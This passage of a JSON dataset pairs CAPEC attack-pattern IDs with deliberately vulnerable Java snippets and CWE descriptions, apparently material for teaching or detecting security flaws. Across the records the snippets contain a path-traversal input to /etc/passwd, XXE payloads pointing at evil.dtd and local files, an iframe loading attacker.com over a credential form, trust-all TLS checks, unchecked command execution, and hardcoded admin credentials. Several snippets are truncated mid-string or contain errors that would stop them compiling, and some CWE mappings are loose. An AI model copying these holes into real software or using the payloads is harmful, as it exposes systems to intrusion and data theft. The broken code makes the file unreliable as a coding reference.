        "description": "This Java code snippet demonstrates the CAPEC of an adversary removing or disabling functionality on the client that the server assumes to be present and trustworthy. It includes CWE-603 Client-Side Authentication, CWE-807 Reliance on Untrusted Inputs in a Security Decision, CWE-829 Inclusion of Functionality from Untrusted Control Sphere, and CWE-494 Download of Code Without Integrity Check. The server relies on the client to implement authentication and authorization mechanisms, which can be bypassed by a modified client. The server also downloads and executes code from an untrusted source without verifying its integrity."
    },
    {
        "capec_id": "208",
        "code_snippet": "public class ShoppingCart {\n    private double totalPrice;\n    private int quantity;\n    private double pricePerItem;\n\n    public ShoppingCart(double pricePerItem) {\n        this.pricePerItem = pricePerItem;\n    }\n\n    public void setQuantity(int quantity) {\n        this.quantity = quantity;\n    }\n\n    public double calculateTotalPrice() {\n        // CWE-682: Incorrect Calculation\n        // CWE-1284: Improper Validation of Specified Quantity in Input\n        // CWE-115: Misinterpretation of Input\n        totalPrice = quantity * pricePerItem;\n        return totalPrice;\n    }\n\n    public void sendOrderToServer() {\n        // CWE-602: Client-Side Enforcement of Server-Side Security\n        // CWE-784: Reliance on Cookies without Validation and Integrity Checking in a Security Decision\n        String cookie = getCookie(\"user_id\");\n        if (cookie != null) {\n            sendOrderToServer(totalPrice, cookie);\n        }\n    }\n\n    private String getCookie(String cookieName) {\n        // CWE-784: Reliance on Cookies without Validation and Integrity Checking in a Security Decision\n        // No validation or integrity checking of the cookie\n        return \"user123\";\n    }\n\n    private void sendOrderToServer(double totalPrice, String cookie) {\n        // CWE-602: Client-Side Enforcement of Server-Side Security\n        // Send the order to the server without validating the totalPrice\n        System.out.println(\"Order sent to server: \" + totalPrice + \" with cookie: \" + cookie);\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC where an attacker can modify the client-side logic to incorrectly calculate the total price of an order, resulting in incorrect information being sent to the server. The code includes CWE-602, CWE-682, CWE-1284, CWE-784, and CWE-115 vulnerabilities."
    },
    {
        "capec_id": "209",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.OutputStream;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {\n        String filename = req.getParameter(\"filename\");\n        File file = new File(filename);\n        if (file.exists()) {\n            resp.setContentType(\"image/jpeg\"); // MIME type mismatch\n            OutputStream out = resp.getOutputStream();\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = fileInputStream.read(buffer)) != -1) {\n                out.write(buffer, 0, bytesRead);\n            }\n            out.flush();\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable servlet that allows an adversary to trick the victim into accessing a URL that responds with a script file. The servlet uses a MIME type of 'image/jpeg' for the response, but the actual file content is a script. If the browser does not invoke script filters before switching to using an interpreter for the real content type, the adversary's script may run on the target unsanitized, revealing the victim's cookies or executing arbitrary script in their browser. This code embodies CWE-79 (Improper Neutralization of Input During Web Page Generation), CWE-20 (Improper Input Validation), CWE-646 (Reliance on File Name or Extension of Externally-Supplied File), CWE-82 (Improper Neutralization of Script in Attributes of IMG Tags in a Web Page), and CWE-84 (Improper Neutralization of Encoded URI Schemes in a Web Page)."
    },
    {
        "capec_id": "211",
        "code_snippet": "import javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.IOException;\n\npublic class VulnerableServlet extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {\n        String userInput = req.getParameter(\"input\");\n        String html = \"<img src='\" + userInput + \"' />\");\n        resp.setContentType(\"text/html\");\n        resp.getWriter().write(html);\n    }\n}\n\n// ActiveX Control\npublic class UnsafeActiveX {\n    public void executeCmd(String cmd) {\n        Runtime.getRuntime().exec(cmd);\n    }\n}\n\n// J2EE Misconfiguration: Missing Custom Error Page\npublic class ErrorPageServlet extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {\n        resp.setContentType(\"text/html\");\n        resp.getWriter().write(\"<h1>Error Occurred: \" + req.getAttribute(\"javax.servlet.error.message\") + \"</h1>\");\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable servlet that is susceptible to Cross-Site Scripting (XSS) attacks due to incomplete denylist-based protection. The servlet takes user input and injects it into an HTML IMG tag without proper neutralization, allowing an attacker to inject malicious scripts. Additionally, an unsafe ActiveX control is exposed, which can be used to execute system commands. The code also includes a J2EE misconfiguration where the default error page displays sensitive information about the product."
    },
    {
        "capec_id": "212",
        "code_snippet": "public class VulnerableCode {\n    private static final String SENSITIVE_INFO = \"secret_key\";\n    private static final int MAX_WRITE_OPERATIONS = 1000;\n    private static int writeOperations = 0;\n\n    public static void main(String[] args) {\n        // CWE-1242: Inclusion of Undocumented Features or Chicken Bits\n        // Using an undocumented feature to access sensitive system information\n        String osInfo = System.getProperty(\"os.info\");\n        System.out.println(\"OS Info: \" + osInfo);\n\n        // CWE-1246: Improper Write Handling in Limited-write Non-Volatile Memories\n        // Improperly handling write operations in non-volatile memory\n        try {\n            writeDataToNonVolatileMemory(SENSITIVE_INFO);\n        } catch (Exception e) {\n            System.out.println(\"Error writing to non-volatile memory: \" + e.getMessage());\n        }\n\n        // CWE-1281: Sequence of Processor Instructions Leads to Unexpected Behavior\n        // Using a specific sequence of processor instructions to cause unexpected behavior\n        try {\n            causeUnexpectedBehavior();\n        } catch (Exception e) {\n            System.out.println(\"Error causing unexpected behavior: \" + e.getMessage());\n        }\n\n        // CWE-695: Use of Low-Level Functionality\n        // Using low-level functionality to access sensitive system information\n        try {\n            useLowLevelFunctionality();\n        } catch (Exception e) {\n            System.out.println(\"Error using low-level functionality: \" + e.getMessage());\n        }\n\n        // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n        // Exposing sensitive system information to an unauthorized control sphere\n        try {\n            exposeSensitiveInfo();\n        } catch (Exception e) {\n            System.out.println(\"Error exposing sensitive information: \" + e.getMessage());\n        }\n    }\n\n    private static void writeDataToNonVolatileMemory(String data) throws Exception {\n        if (writeOperations < MAX_WRITE_OPERATIONS) {\n            // Simulate writing to non-volatile memory\n            System.out.println(\"Writing to non-volatile memory: \" + data);\n            writeOperations++;\n        } else {\n            throw new Exception(\"Maximum write operations exceeded\");\n        }\n    }\n\n    private static void causeUnexpectedBehavior() throws Exception {\n        // Simulate a sequence of processor instructions that leads to unexpected behavior\n        System.out.println(\"Causing unexpected behavior...\");\n        // Simulate a processor lock\n        while (true) {\n            // Do nothing\n        }\n    }\n\n    private static void useLowLevelFunctionality() throws Exception {\n        // Simulate using low-level functionality to access sensitive system information\n        System.out.println(\"Using low-level functionality...\");\n        // Simulate accessing sensitive system information\n        String sensitiveInfo = getSensitiveSystemInfo();\n        System.out.println(\"Sensitive Info: \" + sensitiveInfo);\n    }\n\n    private static void exposeSensitiveInfo() throws Exception {\n        // Simulate exposing sensitive system information to an unauthorized control sphere\n        System.out.println(\"Exposing sensitive information...\");\n        // Simulate exposing sensitive system information\n        String sensitiveInfo = getSensitiveSystemInfo();\n        System.out.println(\"Sensitive Info: \" + sensitiveInfo);\n    }\n\n    private static String getSensitiveSystemInfo() {\n        return SENSITIVE_INFO;\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of leveraging a legitimate capability of an application to achieve a negative technical impact. It includes various CWEs such as inclusion of undocumented features, improper write handling in limited-write non-volatile memories, sequence of processor instructions leading to unexpected behavior, use of low-level functionality, and exposure of sensitive system information to an unauthorized control sphere. These CWEs are used to illustrate how an adversary can exploit legitimate system functionality to gain unauthorized access to sensitive data or cause unexpected behavior."
    },
    {
        "capec_id": "213",
        "code_snippet": "public class PathTraversalVulnerability {\n    public static void getFile(String userInput) {\n        String basePath = \"/var/www/files/\";\n        String filePath = basePath + userInput;\n        File file = new File(filePath);\n        if (file.exists()) {\n            System.out.println(\"File found: \" + filePath);\n        } else {\n            System.out.println(\"File not found: \" + filePath);\n        }\n    }\n\n    public static void main(String[] args) {\n        getFile(\"../../../../etc/passwd\");\n    }\n}",
        "description": "This Java code snippet demonstrates a path traversal vulnerability. The getFile method takes a userInput parameter and constructs a filePath by concatenating it with a basePath. The method then checks if the file exists. An attacker can exploit this vulnerability by providing a userInput that traverses the directory hierarchy, such as \"../../../../etc/passwd\", to access sensitive files outside of the intended directory."
    },
    {
        "capec_id": "214",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class VulnerableServlet extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {\n        String userInput = req.getParameter(\"input\");\n        try {\n            // Direct use of sockets\n            java.net.Socket socket = new java.net.Socket(\"localhost\", 8080);\n            socket.getOutputStream().write(userInput.getBytes());\n            socket.close();\n        } catch (Exception e) {\n            // Missing custom error page, displaying sensitive information\n            resp.setStatus(500);\n            resp.getWriter().write(\"Error: \" + e.getMessage());\n        }\n    }\n}\n\n// Struts: Plug-in Framework not in use\npublic class Validator {\n    public boolean validateInput(String input) {\n        // No input validation\n        return true;\n    }\n}\n\n// Use of dynamic class loading\npublic class DynamicClassLoader {\n    public void loadClass(String className) throws Exception {\n        Class<?> clazz = Class.forName(className);\n        Object obj = clazz.newInstance();\n        // No validation or sanitization of the class name\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable servlet that directly uses sockets, lacks input validation, and uses dynamic class loading. It also includes a missing custom error page that displays sensitive information. These vulnerabilities are related to CWE-7, CWE-106, CWE-246, CWE-534, and CWE-545."
    },
    {
        "capec_id": "215",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\nimport java.util.logging.FileHandler;\nimport java.util.logging.Logger;\nimport java.util.logging.SimpleFormatter;\n\npublic class FuzzingExample {\n    private static final Logger LOGGER = Logger.getLogger(FuzzingExample.class.getName());\n\n    public static void main(String[] args) {\n        try {\n            File file = new File(\\",
        "description": "This Java code snippet demonstrates a fuzzing attack, where an attacker sends random, malformed, or unexpected messages to a target application and observes the application's log or error messages returned. The code generates random input, processes it, and logs any errors or exceptions that occur. The log messages may contain sensitive information, such as file paths or error stack traces, which can be exploited by an attacker. The code also writes sensitive information to a log file, which can be accessed by unauthorized actors."
    },
    {
        "capec_id": "216",
        "code_snippet": "import java.net.Socket;\nimport java.io.DataInputStream;\nimport java.io.DataOutputStream;\n\npublic class VulnerableServer {\n    public static void main(String[] args) throws Exception {\n        Socket socket = new Socket(\"localhost\", 8080);\n        DataInputStream in = new DataInputStream(socket.getInputStream());\n        DataOutputStream out = new DataOutputStream(socket.getOutputStream());\n\n        // CWE-306: Missing Authentication for Critical Function\n        String username = in.readUTF();\n        String password = in.readUTF();\n        if (username.equals(\"admin\") && password.equals(\"password\")) {\n            // CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n            String message = in.readUTF();\n            out.writeUTF(processMessage(message));\n        } else {\n            out.writeUTF(\"Access denied\");\n        }\n\n        // CWE-940: Improper Verification of Source of a Communication Channel\n        String request = in.readUTF();\n        if (request.equals(\"GET_DATA\")) {\n            out.writeUTF(getData());\n        }\n\n        // CWE-300: Channel Accessible by Non-Endpoint\n        out.writeUTF(\"Channel established\");\n\n        // CWE-514: Covert Channel\n        String covertMessage = in.readUTF();\n        System.out.println(\"Covert message received: \" + covertMessage);\n    }\n\n    private static String processMessage(String message) {\n        return message.toUpperCase();\n    }\n\n    private static String getData() {\n        return \"Sensitive data\";\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable server that does not properly authenticate users, verify the integrity of messages, or ensure the security of the communication channel. It allows an adversary to manipulate the communication channel, potentially leading to information exposure, insertion/removal of information, and system compromise."
    },
    {
        "capec_id": "217",
        "code_snippet": "import javax.net.ssl.SSLContext;\nimport javax.net.ssl.TrustManager;\nimport javax.net.ssl.X509TrustManager;\nimport java.io.IOException;\nimport java.net.URL;\nimport java.net.URLConnection;\n\npublic class VulnerableSSL {\n    public static void main(String[] args) throws IOException {\n        // CWE-201: Insertion of Sensitive Information Into Sent Data\n        String sensitiveData = \"username=password\";\n        URL url = new URL(\"https://example.com/login\");\n        URLConnection conn = url.openConnection();\n        conn.setDoOutput(true);\n        conn.getOutputStream().write(sensitiveData.getBytes());\n\n        // CWE-294: Authentication Bypass by Capture-replay\n        // Trust all certificates, do not verify the identity of the server\n        TrustManager[] trustAllCerts = new TrustManager[] {\n            new X509TrustManager() {\n                public java.security.cert.X509Certificate[] getAcceptedIssuers() {\n                    return null;\n                }\n                public void checkClientTrusted(java.security.cert.X509Certificate[] certs, String authType) {\n                }\n                public void checkServerTrusted(java.security.cert.X509Certificate[] certs, String authType) {\n                }\n            }\n        };\n        SSLContext sc = SSLContext.getInstance(\"SSL\");\n        sc.init(null, trustAllCerts, new java.security.SecureRandom());\n        // CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n        // CWE-602: Client-Side Enforcement of Server-Side Security\n        // CWE-940: Improper Verification of Source of a Communication Channel\n        // No verification of the server's identity, no encryption of the data\n        // and no restriction on the communication channel\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of taking advantage of incorrectly configured SSL/TLS communications. It includes CWE-201 by sending sensitive data over the connection, CWE-294 by trusting all certificates and not verifying the server's identity, CWE-923 and CWE-602 by not properly restricting the communication channel, and CWE-940 by not verifying the source of the communication channel."
    },
    {
        "capec_id": "218",
        "code_snippet": "import java.io.IOException;\nimport java.io.StringReader;\nimport java.net.URL;\nimport javax.xml.XMLConstants;\nimport javax.xml.bind.JAXBContext;\nimport javax.xml.bind.JAXBException;\nimport javax.xml.bind.Unmarshaller;\nimport javax.xml.bind.ValidationEventHandler;\nimport javax.xml.validation.Schema;\nimport javax.xml.validation.SchemaFactory;\n\npublic class UDDIVulnerability {\n    public static void main(String[] args) throws JAXBException, IOException {\n        String xml = \\",
        "description": "This Java code snippet demonstrates the CAPEC of spoofing a UDDI message to impersonate a service provider in an e-business transaction. The code does not properly validate the XML input, allowing an attacker to manipulate the data and impersonate a legitimate business. The code also does not verify the authenticity of the data, does not specify the correct destination, and does not ensure message integrity during transmission, making it vulnerable to CWE-345, CWE-941, CWE-924, CWE-300, and CWE-112."
    },
    {
        "capec_id": "219",
        "code_snippet": "import javax.xml.soap.SOAPMessage;\nimport javax.xml.soap.SOAPPart;\nimport javax.xml.transform.Source;\nimport javax.xml.transform.Transformer;\nimport javax.xml.transform.TransformerFactory;\nimport javax.xml.transform.stream.StreamSource;\nimport java.io.StringReader;\n\npublic class XMLRoutingDetourAttack {\n    public static void processXMLMessage(String xmlMessage) throws Exception {\n        // CWE-112: Missing XML Validation\n        // No XML validation against a proper schema\n        Source source = new StreamSource(new StringReader(xmlMessage));\n        Transformer transformer = TransformerFactory.newInstance().newTransformer();\n        transformer.transform(source, new StreamResult(System.out));\n\n        // CWE-611: Improper Restriction of XML External Entity Reference\n        // XML entity with URI that resolves to a document outside of the intended sphere of control\n        String maliciousXml = \\",
        "description": "This Java code snippet demonstrates an XML Routing Detour Attack (CAPEC-94) by exploiting multiple vulnerabilities. It lacks XML validation (CWE-112), allowing an attacker to inject malicious XML content. The code also improperly restricts XML external entity references (CWE-611), enabling an attacker to access external resources. Furthermore, it is vulnerable to XPath injection (CWE-643) and unintended proxy or intermediary issues (CWE-441), allowing an attacker to control the XPath expression and forward requests to external actors. Finally, the code dispatches the SOAP message to an externally controlled resource (CWE-610), completing the routing detour attack."
    },
    {
        "capec_id": "220",
        "code_snippet": "import java.net.Socket;\nimport java.io.DataOutputStream;\nimport java.io.DataInputStream;\nimport javax.crypto.Cipher;\nimport javax.crypto.KeyGenerator;\nimport javax.crypto.SecretKey;\n\npublic class InsecureCommunication {\n    public static void main(String[] args) throws Exception {\n        Socket socket = new Socket(\"localhost\", 8080);\n        DataOutputStream dout = new DataOutputStream(socket.getOutputStream());\n        DataInputStream din = new DataInputStream(socket.getInputStream());\n\n        // CWE-757: Using a weak encryption algorithm\n        KeyGenerator keyGen = KeyGenerator.getInstance(\"DES\");\n        SecretKey key = keyGen.generateKey();\n        Cipher cipher = Cipher.getInstance(\"DES\");\n        cipher.init(Cipher.ENCRYPT_MODE, key);\n\n        // CWE-602: Client-side enforcement of server-side security\n        dout.writeUTF(\"Authentication successful\");\n        dout.flush();\n\n        // CWE-294: Authentication bypass by capture-replay\n        dout.writeUTF(\"Replayed authentication message\");\n        dout.flush();\n\n        // CWE-941: Incorrectly specified destination in a communication channel\n        dout.writeUTF(\"http://wrong-destination.com\");\n        dout.flush();\n\n        // CWE-246: Direct use of sockets\n        socket.close();\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of exploiting weaknesses in communication protocols. It includes CWE-757 by using a weak encryption algorithm (DES), CWE-602 by relying on client-side enforcement of server-side security, CWE-294 by allowing authentication bypass through capture-replay, CWE-941 by incorrectly specifying the destination in a communication channel, and CWE-246 by directly using sockets instead of framework method calls."
    },
    {
        "capec_id": "221",
        "code_snippet": "import javax.xml.parsers.DocumentBuilderFactory;\nimport javax.xml.parsers.DocumentBuilder;\nimport org.w3c.dom.Document;\nimport org.w3c.dom.Element;\n\npublic class XMLDenialOfService {\n    public static void main(String[] argv) {\n        try {\n            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\n            dbf.setExpandEntityReferences(true);\n            DocumentBuilder db = dbf.newDocumentBuilder();\n            String xml = \"<?xml version=\\\"1.0\\\"?><!DOCTYPE doc [<!ENTITY large SYSTEM \\\"http://example.com/large.xml\\\">]>\";\n            Document doc = db.parse(new java.io.ByteArrayInputStream(xml.getBytes()));\n            Element root = doc.getDocumentElement();\n            System.out.println(root.getTextContent());\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a denial of service vulnerability through XML entity expansion. The code creates an XML document with an entity reference to an external URI, which can potentially consume a large amount of resources, leading to a denial of service condition. The CWEs related to this CAPEC include CWE-611 (Improper Restriction of XML External Entity Reference), CWE-99 (Improper Control of Resource Identifiers), CWE-646 (Reliance on File Name or Extension of Externally-Supplied File), CWE-594 (J2EE Framework: Saving Unserializable Objects to Disk), and CWE-433 (Unparsed Raw Web Content Delivery)."
    },
    {
        "capec_id": "222",
        "code_snippet": "public class VulnerableIFrameOverlay {\\n\\t\\tpublic static void main(String[] args) {\\n\\t\\t\\tString userInput = \"<iframe src='http://attacker.com/malicious_page' width='100%' height='100%'>\";\\n\\t\\t\\tString htmlPage = \"<html><body>\" + userInput + \"<form><input type='text' name='credentials'/><input type='submit' value='Login'/></form></body></html>\";\\n\\t\\t\\t// Render the HTML page without proper validation or sanitization\\n\\t\\t\\tSystem.out.println(htmlPage);\\n\\t\\t}\\n}\\n",
        "description": "This Java code snippet demonstrates an iFrame overlay attack by generating an HTML page with an iframe that loads content from an attacker-controlled domain. The userInput variable contains malicious input that is not properly sanitized, allowing an attacker to inject an iframe with a phishing page. The generated HTML page is then rendered without proper validation, making it vulnerable to cross-site scripting (CWE-79) and improper restriction of rendered UI layers or frames (CWE-1021). The lack of proper representation of critical information (CWE-451) and potential context switching race condition (CWE-368) further exacerbate the vulnerability. The code also neglects to neutralize script in attributes of IMG tags (CWE-82), making it susceptible to additional attacks."
    },
    {
        "capec_id": "224",
        "code_snippet": "import java.net.InetAddress;\nimport java.net.UnknownHostException;\n\npublic class FingerprintingExample {\n    public static void main(String[] args) {\n        InetAddress inetAddress;\n        try {\n            inetAddress = InetAddress.getLocalHost();\n            System.out.println(\"OS Name: \" + System.getProperty(\"os.name\"));\n            System.out.println(\"OS Version: \" + System.getProperty(\"os.version\"));\n            System.out.println(\"OS Architecture: \" + System.getProperty(\"os.arch\"));\n            System.out.println(\"Java Version: \" + System.getProperty(\"java.version\"));\n            System.out.println(\"Hostname: \" + inetAddress.getHostName());\n            System.out.println(\"IP Address: \" + inetAddress.getHostAddress());\n        } catch (UnknownHostException e) {\n            System.out.println(\"Unable to get InetAddress\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of fingerprinting, where an adversary can gather sensitive information about the target system, including OS name, version, architecture, Java version, hostname, and IP address. This information can be used to identify potential vulnerabilities in the system. The code exposes sensitive information to an unauthorized actor (CWE-200), sensitive system information to an unauthorized control sphere (CWE-497), and improper management of sensitive trace data (CWE-1323). Additionally, the code may exhibit observable behavioral discrepancies with equivalent products (CWE-207) and allow activation of test or debug logic at runtime (CWE-1313)."
    },
    {
        "capec_id": "226",
        "code_snippet": "public class VulnerableSessionHandler {\n    private Map<String, String> sessions = new HashMap<>();\n\n    public void authenticateUser(String username, String password) {\n        // Weak authentication, no validation or integrity checking\n        Cookie cookie = new Cookie(\"session_id\", username + \":\" + password);\n        sessions.put(cookie.getValue(), username);\n    }\n\n    public boolean isValidSession(String sessionId) {\n        // No expiration or validation of session ID\n        return sessions.containsKey(sessionId);\n    }\n\n    public void performAction(String sessionId, String action) {\n        // No server-side authentication, relies on client-side authentication\n        if (isValidSession(sessionId)) {\n            // Perform action without re-authenticating\n            System.out.println(\"Performing action: \" + action);\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable session handler that relies on client-side authentication and does not properly validate or expire session IDs, making it susceptible to session fixation and insufficient session expiration attacks. The authenticateUser method sets a cookie with the username and password, which can be easily manipulated by an attacker. The isValidSession method only checks if the session ID exists in the map, without verifying its integrity or expiration. The performAction method relies on the client-side authentication and does not re-authenticate the user, allowing an attacker to reuse an old session ID."
    },
    {
        "capec_id": "227",
        "code_snippet": "public class ResourceTieUp {\n    private static final int MAX_CONCURRENT_REQUESTS = 100;\n    private static final ExecutorService executor = Executors.newFixedThreadPool(MAX_CONCURRENT_REQUESTS);\n    private static final Map<String, Object> resourceMap = new HashMap<>();\n\n    public static void main(String[] args) {\n        for (int i = 0; i < 1000; i++) {\n            executor.submit(new ResourceConsumer(\"Resource\" + i));\n        }\n    }\n\n    static class ResourceConsumer implements Runnable {\n        private String resourceId;\n\n        public ResourceConsumer(String resourceId) {\n            this.resourceId = resourceId;\n        }\n\n        @Override\n        public void run() {\n            Object resource = resourceMap.get(resourceId);\n            if (resource == null) {\n                resource = new Object();\n                resourceMap.put(resourceId, resource);\n            }\n            // Perform some CPU-intensive operation\n            for (int j = 0; j < 1000000; j++) {\n                Math.sqrt(j);\n            }\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of tying up a resource by continually engaging it with benign requests. The code creates a fixed thread pool of 100 threads and submits 1000 tasks to consume a resource. Each task performs a CPU-intensive operation, keeping the resource engaged for a prolonged period. The resource map is not properly controlled, allowing an adversary to allocate an excessive number of resources, leading to resource exhaustion. This code embodies CWE-400: Uncontrolled Resource Consumption, CWE-770: Allocation of Resources Without Limits or Throttling, and CWE-1229: Creation of Emergent Resource."
    },
    {
        "capec_id": "228",
        "code_snippet": "import javax.xml.parsers.DocumentBuilderFactory;\nimport javax.xml.parsers.DocumentBuilder;\nimport org.w3c.dom.Document;\nimport org.xml.sax.InputSource;\n\npublic class XMLParser {\n    public static void main(String[] args) throws Exception {\n        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n        factory.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", false);\n        DocumentBuilder builder = factory.newDocumentBuilder();\n        String xml = \"<?xml version=\\\"1.0\\\" encoding=\\\"ISO-8859-1\\\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \\\"http://example.com/evil.dtd\\\">]><foo>&xxe;</foo>\";\n        Document doc = builder.parse(new InputSource(new java.io.StringReader(xml)));\n        System.out.println(doc.getDocumentElement().getTextContent());\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable XML parser that is susceptible to XML Entity Expansion attacks. The code creates a DocumentBuilderFactory and sets the feature to allow DOCTYPE declarations. It then parses an XML string that contains a malicious DTD reference, which can cause the parser to consume excessive resources or access unauthorized files. This code embodies the main idea of the CAPEC and relates to CWEs 829, 776, 827, 611, and 91."
    },
    {
        "capec_id": "229",
        "code_snippet": "import java.io.StringReader;\nimport javax.xml.parsers.DocumentBuilder;\nimport javax.xml.parsers.DocumentBuilderFactory;\nimport org.w3c.dom.Document;\nimport org.xml.sax.InputSource;\n\npublic class VulnerableParser {\n    public static void parseXML(String xml) {\n        try {\n            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n            DocumentBuilder builder = factory.newDocumentBuilder();\n            Document document = builder.parse(new InputSource(new StringReader(xml)));\n            // No restrictions on the size or number of resources allocated\n            // No validation of XML entities\n            // No neutralization of special elements\n            // No consideration for machine-dependent data representation\n        } catch (Exception e) {\n            System.out.println(\"Error parsing XML: \" + e.getMessage());\n        }\n    }\n\n    public static void main(String[] args) {\n        String maliciousXML = \"<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?>\\n\" +\n                \"<!ENTITY file \\\\\"file:///etc/passwd\\\">\\n\" +\n                \"<!ELEMENT root ANY >\\n\" +\n                \"<!ATTLIST root attr ENTITY #IMPLIED >\\n\" +\n                \"<root attr=\\\"file\\\">\\n\" +\n                \"</root>\";\n        parseXML(maliciousXML);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable XML parser that can be exploited for a denial of service attack. The parser does not impose any restrictions on the size or number of resources allocated, does not validate XML entities, does not neutralize special elements, and does not consider machine-dependent data representation. The malicious XML input can cause the parser to exhaust CPU resources, leading to a denial of service condition."
    },
    {
        "capec_id": "230",
        "code_snippet": "import javax.xml.parsers.DocumentBuilderFactory;\nimport javax.xml.parsers.DocumentBuilder;\nimport org.w3c.dom.Document;\nimport org.w3c.dom.Element;\n\npublic class VulnerableParser {\n    public static void parseXML(String xml) {\n        try {\n            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n            DocumentBuilder builder = factory.newDocumentBuilder();\n            Document document = builder.parse(new java.io.ByteArrayInputStream(xml.getBytes()));\n            Element element = document.getDocumentElement();\n            // No validation against a proper schema\n            // No input validation on the XML structure\n            // No limits on the recursion or resource allocation\n            processElement(element);\n        } catch (Exception e) {\n            // No proper error handling\n        }\n    }\n\n    public static void processElement(Element element) {\n        // Uncontrolled recursion\n        if (element.hasChildNodes()) {\n            for (int i = 0; i < element.getChildNodes().getLength(); i++) {\n                processElement((Element) element.getChildNodes().item(i));\n            }\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable XML parser that is susceptible to excessive resource consumption and CPU utilization due to uncontrolled recursion and lack of input validation. The parser does not validate the XML against a proper schema, allowing an adversary to inject malicious data that can cause the parser to consume excessive resources."
    },
    {
        "capec_id": "231",
        "code_snippet": "import javax.xml.bind.Unmarshaller;\nimport javax.xml.bind.JAXBException;\nimport java.io.StringReader;\n\npublic class VulnerableXMLParser {\n    public static void parseXML(String xml) {\n        try {\n            Unmarshaller unmarshaller = JAXBContext.newInstance().createUnmarshaller();\n            unmarshaller.unmarshal(new StringReader(xml));\n        } catch (JAXBException e) {\n            // ignore\n        }\n    }\n\n    public static void main(String[] args) {\n        String maliciousXML = \"<?xml version=\\\"1.0\\\"?><!ELEMENT foo (bar|foo)*><foo><foo><foo>...<foo></foo></foo></foo>\";\n        for (int i = 0; i < 10000; i++) {\n            parseXML(maliciousXML);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of injecting oversized serialized data payloads into a parser, leading to adverse effects such as exhausting system resources. The CWEs embodied in this code include: CWE-112 (Missing XML Validation) as the code does not validate the XML against a proper schema; CWE-20 (Improper Input Validation) as the code does not validate the input XML; CWE-674 (Uncontrolled Recursion) as the XML payload is designed to cause excessive recursion; CWE-770 (Allocation of Resources Without Limits or Throttling) as the code allocates resources without restrictions; and CWE-1102 (Reliance on Machine-Dependent Data Representation) as the code relies on the underlying machine's data representation."
    },
    {
        "capec_id": "233",
        "code_snippet": "public class PrivilegeEscalation {\n    public static void main(String[] args) {\n        // CWE-269: Improper Privilege Management\n        // Assigning elevated privileges to an unauthorized user\n        User unauthorizedUser = new User(\"unauthorized\", \"password\");\n        unauthorizedUser.setPrivileges(\"admin\");\n\n        // CWE-1264: Hardware Logic with Insecure De-Synchronization between Control and Data Channels\n        // Incorrectly forwarding data before security checks are complete\n        HardwareDevice device = new HardwareDevice();\n        device.sendData(unauthorizedUser, \"sensitive_data\");\n\n        // CWE-1311: Improper Translation of Security Attributes by Fabric Bridge\n        // Incorrectly translating security attributes between fabric protocols\n        FabricBridge bridge = new FabricBridge();\n        bridge.translateSecurityAttributes(unauthorizedUser, \"trusted_protocol\", \"untrusted_protocol\");\n\n        // CWE-653: Improper Isolation or Compartmentalization\n        // Not properly isolating functionality with different privilege levels\n        unauthorizedUser.performAdminAction();\n\n        // CWE-274: Improper Handling of Insufficient Privileges\n        // Not handling insufficient privileges for an operation\n        try {\n            unauthorizedUser.deleteSensitiveData();\n        } catch (InsufficientPrivilegesException e) {\n            // Ignore the exception and continue execution\n        }\n    }\n}\n\nclass User {\n    private String username;\n    private String password;\n    private String privileges;\n\n    public User(String username, String password) {\n        this.username = username;\n        this.password = password;\n    }\n\n    public void setPrivileges(String privileges) {\n        this.privileges = privileges;\n    }\n\n    public void performAdminAction() {\n        System.out.println(\"Performing admin action...\");\n    }\n\n    public void deleteSensitiveData() {\n        System.out.println(\"Deleting sensitive data...\");\n    }\n}\n\nclass HardwareDevice {\n    public void sendData(User user, String data) {\n        System.out.println(\"Sending data: \" + data);\n    }\n}\n\nclass FabricBridge {\n    public void translateSecurityAttributes(User user, String sourceProtocol, String targetProtocol) {\n        System.out.println(\"Translating security attributes from \" + sourceProtocol + \" to \" + 